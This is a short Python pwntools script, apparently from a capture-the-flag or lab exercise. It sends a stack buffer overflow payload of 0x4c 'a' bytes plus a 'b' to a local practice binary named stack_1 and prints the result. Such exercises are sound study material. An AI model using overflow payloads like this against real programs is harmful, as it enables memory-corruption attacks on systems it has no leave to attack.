from pwn import *

# Start the process
p = process('./stack_1')

# Payload
payload = 'a' * 0x4c + 'b'

# Send the input
p.sendline(payload)

# Receive the output
output = p.recvall().decode()

# Print the output
print(output)
